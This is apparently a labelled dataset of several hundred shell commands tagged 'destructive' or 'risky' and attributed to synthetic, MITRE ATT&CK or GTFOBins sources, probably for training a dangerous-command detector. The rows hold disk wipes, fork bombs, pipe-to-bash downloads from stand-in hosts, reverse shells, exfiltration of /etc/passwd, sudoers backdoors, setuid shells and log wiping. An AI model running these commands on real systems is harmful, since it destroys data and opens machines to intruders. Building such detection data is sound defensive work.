command,label,source
dd if=/dev/urandom of=/dev/sdc bs=1M,destructive,synthetic
wipefs -a /dev/sda,destructive,synthetic
sudo parted,destructive,synthetic
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
rm -rf /var,destructive,mitre-attack
wipefs -a /dev/sdc,destructive,synthetic
mkswap /dev/sda2 && swapon /dev/sda2,destructive,mitre-attack
chmod 777 / && rm -rf /var,destructive,mitre-attack
shred -n 3 /dev/sdb,destructive,synthetic
mkfs.vfat /dev/sda3,destructive,synthetic
mkfs.vfat /dev/sda,destructive,synthetic
shred -n 3 /dev/sda,destructive,synthetic
dd if=/dev/urandom of=/dev/nvme0n1 bs=64K,destructive,synthetic
dd if=/dev/random of=/dev/nvme0n1 bs=4M,destructive,synthetic
dd if=/dev/random of=/dev/sda bs=1M,destructive,synthetic
dd if=/dev/urandom of=/dev/sda bs=4M,destructive,synthetic
dd if=/dev/zero of=/dev/sdb bs=4M,destructive,synthetic
echo yes | mkfs.ext4 /dev/sda3,destructive,mitre-attack
dd if=/dev/zero of=/dev/nvme0n1 bs=512,destructive,synthetic
shred -n 3 /dev/mmcblk0,destructive,synthetic
rm -rf /usr/bin,destructive,mitre-attack
mkfs.vfat /dev/nvme0n1,destructive,synthetic
echo 'rm -rf /' > /etc/rc.local && chmod +x /etc/rc.local,destructive,mitre-attack
apt-get remove -y --purge linux-image-* && update-grub,destructive,mitre-attack
mkfs.ext4 /dev/nvme0n1,destructive,synthetic
rm -rf /sys,destructive,mitre-attack
dd if=/dev/random of=/dev/mmcblk0 bs=512,destructive,synthetic
hdparm --user-master u --security-set-pass p /dev/sda,destructive,mitre-attack
shred -vfz /dev/sda,destructive,mitre-attack
blkdiscard /dev/sda,destructive,mitre-attack
find / -exec rm -rf {} +,destructive,mitre-attack
yes > /dev/null &,destructive,mitre-attack
dd if=/dev/random of=/dev/sdb1,destructive,synthetic
mv /lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/libc.so.6.bak,destructive,mitre-attack
dd if=/dev/zero of=/dev/mmcblk0 bs=1M,destructive,synthetic
dd if=/dev/urandom of=/boot/vmlinuz bs=1M count=8,destructive,mitre-attack
dd if=/dev/random of=/dev/sda bs=512,destructive,synthetic
dd if=/dev/urandom of=/dev/sdc bs=4M,destructive,synthetic
dd if=/dev/zero of=/dev/mmcblk0 bs=512,destructive,synthetic
mkfs.xfs /dev/sda3,destructive,synthetic
dd if=/dev/urandom of=/dev/sda bs=64K,destructive,synthetic
dd if=/dev/random of=/dev/nvme0n1 bs=64K,destructive,synthetic
dd if=/dev/random of=/dev/sdb bs=4M,destructive,synthetic
mkfs.ext3 /dev/sdb1,destructive,synthetic
dd if=/dev/zero of=/dev/sdb1,destructive,mitre-attack
rm /etc/shadow,destructive,mitre-attack
dd if=/dev/random of=/dev/mmcblk0 bs=4M,destructive,synthetic
dd if=/dev/zero of=/dev/mmcblk0 bs=64K,destructive,synthetic
dd if=/dev/random of=/dev/sdb bs=64K,destructive,synthetic
rm -rf /proc,destructive,mitre-attack
mkfs.ext4 /dev/mmcblk0,destructive,synthetic
rm -rf /lib,destructive,mitre-attack
sudo mkfs,destructive,synthetic
rm -fr /,destructive,mitre-attack
dd if=/dev/zero of=/dev/sdc bs=512,destructive,synthetic
rm -rf /root,destructive,synthetic
cat /dev/zero > /dev/sda,destructive,mitre-attack
fdisk -l /dev/sda && echo 'n p 1' | fdisk /dev/sda,destructive,mitre-attack
dd if=/dev/random of=/dev/sda bs=64K,destructive,synthetic
while true; do true; done,destructive,mitre-attack
wipe -fd /dev/sda,destructive,mitre-attack
rm -rf /usr/local/lib/python3.11,destructive,mitre-attack
rm -rf /lib/modules,destructive,mitre-attack
shred -n 7 -z /dev/sdb,destructive,synthetic
sudo fdisk,destructive,synthetic
curl http://pwn.example/run.sh | sudo bash,risky,synthetic
chmod 4000 /bin/vi,risky,synthetic
bash -c '$(curl http://example.com/p)',risky,mitre-attack
rm -rf /var/lib/docker,risky,mitre-attack
"printf ':(){ :|:& };:
' | sh",risky,mitre-attack
curl http://192.168.1.50/x | sudo bash,risky,synthetic
chmod 4777 /tmp/x,risky,synthetic
find / -name 'x' -exec /bin/sh \;,risky,gtfobins
chmod -R 777 /usr/local/app,risky,synthetic
crontab -e,risky,mitre-attack
sudo chmod 644 /etc/sudoers,risky,mitre-attack
iptables -A OUTPUT -j DROP,risky,mitre-attack
wget -qO- https://bad.org/x.sh | bash,risky,synthetic
mkfile 5g bigfile,risky,mitre-attack
socat TCP:10.0.0.5:9999 EXEC:/bin/sh,risky,mitre-attack
chmod 777 ~/.ssh,risky,synthetic
chmod -R 777 /mnt/data,risky,synthetic
wget -qO- http://evil.com/install | sh,risky,synthetic
chmod -R 777 /var/www/html,risky,synthetic
wget -qO- http://evil.com/x.sh | sh,risky,synthetic
rm -f package-lock.json,risky,mitre-attack
curl http://pwn.example/setup.sh | bash,risky,synthetic
swapoff -a,risky,mitre-attack
chmod 777 /tmp/data,risky,mitre-attack
rm -rf /tmp/cache/*,risky,mitre-attack
chmod -R 777 /tmp/uploads,risky,synthetic
usermod -aG docker $USER && newgrp docker,risky,mitre-attack
passwd -d root,risky,mitre-attack
curl http://192.168.1.50/install.sh | sudo bash,risky,synthetic
curl http://192.168.1.50/setup.sh | bash,risky,synthetic
mount --bind /proc /mnt/proc,risky,mitre-attack
halt -f,risky,mitre-attack
ifdown eth0,risky,mitre-attack
PYTHONPATH=/tmp python script.py,risky,mitre-attack
"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",risky,mitre-attack
sudo apt-get remove --purge -y nginx,risky,mitre-attack
curl https://evil.net/setup.sh | sh,risky,synthetic
chmod -R 766 /opt/app,risky,synthetic
"perl -e 'exec ""/bin/sh"";'",risky,gtfobins
chmod 777 ~/.ssh/config,risky,mitre-attack
curl http://example.com/payload | bash,risky,synthetic
curl http://192.168.1.50/payload | sudo bash,risky,synthetic
curl http://10.0.0.9/run.sh | bash,risky,synthetic
sudo systemctl stop apparmor,risky,mitre-attack
echo 'aGVsbG8=' | base64 -d,risky,mitre-attack
chmod -R 777 /home/deploy/releases,risky,synthetic
chmod 777 /etc/sudoers,risky,synthetic
rm -rf ./build,risky,synthetic
sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config,risky,synthetic
usermod -aG sudo guestuser,risky,synthetic
git push --force origin main,risky,synthetic
git reset --hard HEAD~5,risky,synthetic
git branch -D release,risky,synthetic
export HISTSIZE=0,risky,synthetic
truncate -s 0 /var/log/auth.log,risky,synthetic
shred -n 1 access.log,risky,synthetic
docker run --privileged -v /:/host alpine chroot /host,risky,synthetic
setenforce 0,risky,synthetic
sudo npm install -g some-package,risky,synthetic
docker run --cap-add=ALL ubuntu bash,risky,synthetic
sudo chmod -R 777 /usr/bin,risky,synthetic
"echo ""user ALL=(ALL) NOPASSWD:ALL"" >> /etc/sudoers",risky,synthetic
dd if=/dev/zero of=testfile.img bs=1M count=100,risky,synthetic
wget http://example.com/lib.so.tar.gz && tar xzf lib.so.tar.gz -C /usr/lib,risky,synthetic
curl http://example.com/plugin.zip -o plugin.zip && unzip -o plugin.zip -d /var/www/plugins,risky,synthetic
wget http://203.0.113.7/patch.tar.gz -O - | tar x -C /,risky,synthetic
echo 0 > /proc/sys/net/ipv4/ip_forward,risky,mitre-attack
curl -O http://example.com/module.tar.gz && tar xf module.tar.gz -C /lib,risky,synthetic
sudo pip install package-from-untrusted-source,risky,synthetic
chmod 777 id_rsa,risky,synthetic
wget http://example.com/update.tar.gz && tar --overwrite -xzf update.tar.gz -C /etc,risky,synthetic
"tar -cf - /var/www | ssh backup@server ""tar xf - -C /backup""",risky,synthetic
rm -rf node_modules,risky,synthetic
rm -rf /home/user/project/old_version,risky,synthetic
rm -rf ~/Downloads/*,risky,synthetic
rm -rf /tmp/*,risky,synthetic
rm -rf .git,risky,synthetic
rm -rf $HOME/.cache,risky,synthetic
rm -rf /var/cache/apt/*,risky,synthetic
rm -rf dist/,risky,synthetic
rm -rf venv/,risky,synthetic
curl -L http://example.com/release.tar.gz | tar xz -C /opt/release,risky,synthetic
rm -rf /var/log/*.old,risky,synthetic
chmod -R 777 /home/user/site,risky,synthetic
chmod -R 777 ./build,risky,synthetic
chmod -R 777 /srv/data,risky,synthetic
chmod -R 777 ~/project,risky,synthetic
lynx -source http://evil.com/payload | sh,risky,mitre-attack
logger -p auth.warn 'fake auth failure',risky,mitre-attack
rm -rf /home/deploy/backups/2023,risky,synthetic
sudo chmod 777 /etc/shadow,risky,mitre-attack
rm -rf target/,risky,synthetic
rm -rf /opt/app/old_release,risky,synthetic
gdb -ex 'shell /bin/sh',risky,gtfobins
visudo -c && echo 'baduser ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,risky,mitre-attack
sudo usermod -aG sudo normaluser,risky,mitre-attack
chmod 777 /opt/app,risky,mitre-attack
curl http://pwn.example/payload | sh,risky,synthetic
wget -qO- http://example.com/setup.sh | sh,risky,mitre-attack
chown -R nobody:nogroup /home/user,risky,mitre-attack
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,risky,mitre-attack
"sudo su -c 'echo ""* * * * * /tmp/x"" | crontab -'",risky,mitre-attack
curl http://pwn.example/x | sudo bash,risky,synthetic
systemctl disable systemd-resolved,risky,mitre-attack
curl http://pwn.example/payload | bash,risky,synthetic
curl https://evil.net/x | sudo bash,risky,synthetic
echo 'www-data:x:0:0:root:/root:/bin/bash' >> /etc/passwd,risky,mitre-attack
systemctl stop NetworkManager,risky,mitre-attack
echo 'IyEvYmluL2Jhc2gK' | base64 -d | bash,risky,mitre-attack
rm -rf /home/user/important-project,risky,mitre-attack
unset PATH,risky,mitre-attack
curl http://10.0.0.9/setup.sh | bash,risky,synthetic
dd if=/dev/urandom of=/tmp/random bs=1M count=512,risky,mitre-attack
curl http://example.com/install.sh | sudo bash,risky,synthetic
sudo su -,risky,mitre-attack
systemd-run --on-calendar='* * * * *' /tmp/x.sh,risky,mitre-attack
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1,risky,mitre-attack
sudo dpkg --configure -a && rm -rf /var/lib/dpkg/lock,risky,mitre-attack
sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config,risky,mitre-attack
systemctl disable ufw,risky,mitre-attack
scp -r /etc user@remote:/tmp/etc_backup,risky,synthetic
sudo rm -rf /var/tmp/old*,risky,mitre-attack
sh -i >& /dev/udp/10.0.0.5/7777 0>&1,risky,mitre-attack
git reset --hard HEAD~1,risky,mitre-attack
unset HISTFILE,risky,mitre-attack
nc 10.0.0.5 5555 < /etc/passwd,risky,mitre-attack
"mount -o remount,rw /",risky,mitre-attack
pkill -9 -u root,risky,mitre-attack
truncate -s 0 ~/.bash_history,risky,mitre-attack
su - root,risky,mitre-attack
echo 'md5:$1$abc$xyz' >> /etc/shadow,risky,mitre-attack
sudo su,risky,mitre-attack
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 5555 > /tmp/f,risky,mitre-attack
export PATH=/tmp:$PATH,risky,mitre-attack
kill -9 $(pgrep -u root),risky,mitre-attack
"git config --global user.email ""attacker@evil.com""",risky,mitre-attack
wget http://evil.com/backdoor.py -O /tmp/b.py && python /tmp/b.py,risky,mitre-attack
HISTSIZE=0,risky,mitre-attack
init 0,risky,mitre-attack
shutdown -h now,risky,mitre-attack
sudo chmod -R 777 /usr/local,risky,mitre-attack
export LD_LIBRARY_PATH=/tmp,risky,mitre-attack
wget http://evil.com/tools.tar.gz -O /tmp/t.tgz && tar xzf /tmp/t.tgz -C /usr/local/bin,risky,mitre-attack
reboot --force,risky,mitre-attack
curl http://10.0.0.9/x | bash,risky,synthetic
wipe -fd /tmp/data,risky,mitre-attack
mount -o bind /home /mnt,risky,mitre-attack
cat /dev/null > ~/.bash_history,risky,mitre-attack
sudo bash <(curl -fsSL http://evil.com/init.sh),risky,mitre-attack
"git config --global url.""https://evil.com"".insteadOf ""https://github.com""",risky,mitre-attack
curl http://192.168.1.50/setup.sh | sudo bash,risky,synthetic
chmod 777 /etc,risky,mitre-attack
umount -l /var/lib/docker,risky,mitre-attack
usermod -o -u 0 username,risky,mitre-attack
sudo sysctl -w kernel.randomize_va_space=0,risky,mitre-attack
ftp -o /tmp/p http://evil.com/x.sh && sh /tmp/p,risky,mitre-attack
chattr -i /etc/passwd,risky,mitre-attack
chmod 600 /etc/shadow,risky,mitre-attack
chmod -R 755 .,risky,synthetic
docker rmi -f $(docker images -q),risky,mitre-attack
"sh -c ""$(wget -qO- http://example.com/run.sh)""",risky,mitre-attack
kubectl delete ns staging,risky,mitre-attack
kill -9 1,risky,mitre-attack
sudo chown -R 0:0 /var/www && sudo chmod -R 777 /var/www,risky,mitre-attack
openssl passwd -1 password123,risky,mitre-attack
service mysql stop,risky,mitre-attack
rm -rf dist/*,risky,mitre-attack
curl http://example.com/setup.sh | bash,risky,synthetic
at now + 1 minute -f /tmp/job.sh,risky,mitre-attack
cat ~/.ssh/id_rsa,risky,mitre-attack
curl http://192.168.1.50/payload | sh,risky,synthetic
rm -rf build/,risky,mitre-attack
sudo iptables -P FORWARD DROP,risky,mitre-attack
git push --force-with-lease origin main,risky,mitre-attack
curl https://evil.net/payload | sudo bash,risky,synthetic
sudo sysctl -w net.ipv4.conf.all.rp_filter=0,risky,mitre-attack
scp /etc/passwd user@evil.com:/tmp/,risky,mitre-attack
curl http://example.com/x | sudo bash,risky,synthetic
npm cache clean --force && rm -rf node_modules,risky,mitre-attack
curl http://example.com/setup.sh | sh,risky,synthetic
killall -9 java,risky,mitre-attack
curl http://192.168.1.50/x | sh,risky,synthetic
kubectl delete pod --all --grace-period=0 --force,risky,mitre-attack
history -c,risky,mitre-attack
chmod 777 /var/run/docker.sock,risky,mitre-attack
pip cache purge,risky,mitre-attack
pkill -9 -f 'java.*application',risky,mitre-attack
curl http://pwn.example/payload | sudo bash,risky,synthetic
sudo setenforce 0,risky,mitre-attack
rsync -av /home/user/ user@remote:/backup/,risky,synthetic
curl http://192.168.1.50/install.sh | sh,risky,synthetic
"tar czf - /var/log | ssh 203.0.113.5 ""cat > logs.tar.gz""",risky,synthetic
curl https://evil.net/install.sh | bash,risky,synthetic
wget -qO- https://bad.org/x.sh | sh,risky,synthetic
chmod 4000 /tmp/x,risky,synthetic
echo 0 > /proc/sys/kernel/randomize_va_space,risky,mitre-attack
curl http://10.0.0.9/run.sh | sudo bash,risky,synthetic
chmod 4777 /bin/vi,risky,synthetic
rm -rf logs/,risky,synthetic
rm -rf ./node_modules,risky,mitre-attack
nc 10.0.0.5 1234 -e /bin/bash,risky,mitre-attack
rm -rf dist,risky,synthetic
echo ZWNobyByb290 | base64 -d | sh,risky,synthetic
wget -qO- http://10.0.0.9/run | sh,risky,synthetic
sh <(curl http://example.com/s.sh),risky,mitre-attack
chmod u+s /bin/vi,risky,synthetic
chmod 4755 /usr/bin/find,risky,synthetic
chmod 4000 /usr/bin/find,risky,synthetic
curl https://evil.net/run.sh | bash,risky,synthetic
chmod 4755 /bin/busybox,risky,synthetic
rm -rf .cache,risky,synthetic
wget -qO- https://bad.org/run | bash,risky,synthetic
rm -rf vendor/,risky,synthetic
chmod u+s /bin/busybox,risky,synthetic
echo IyEvYmluL2Jhc2gK | base64 -d | bash,risky,synthetic
chmod 4000 /bin/bash,risky,synthetic
export HOME=/tmp/fakehome,risky,mitre-attack
docker exec -it container /bin/sh,risky,mitre-attack
chmod 4755 /bin/bash,risky,synthetic
curl http://pwn.example/run.sh | sh,risky,synthetic
export LD_PRELOAD=$(cmd),risky,synthetic
wget -qO- http://10.0.0.9/run | bash,risky,synthetic
PATH=$PATH:/tmp,risky,mitre-attack
wget -qO- http://evil.com/install | bash,risky,synthetic
rm -f /etc/ssh/sshd_config.bak,risky,mitre-attack
tar --checkpoint=1 --checkpoint-action=exec=/bin/sh,risky,gtfobins
curl http://192.168.1.50/run.sh | bash,risky,synthetic
chmod -R 766 /tmp/data,risky,synthetic
export IFS=/home/user/evil.so,risky,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
killall -9 postgres,risky,mitre-attack
curl https://evil.net/install.sh | sudo bash,risky,synthetic
chmod -R 777 /home/user/public,risky,synthetic
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash,risky,mitre-attack
curl http://192.168.1.50/x | bash,risky,synthetic
curl http://pwn.example/install.sh | sudo bash,risky,synthetic
sudo dd if=/dev/zero of=/var/log/syslog bs=1M count=10,risky,mitre-attack
chmod 777 /etc/hosts,risky,mitre-attack
rm -rf build,risky,synthetic
ufw disable,risky,mitre-attack
docker system prune -a -f,risky,mitre-attack
fetch http://evil.com/p && /bin/sh p,risky,mitre-attack
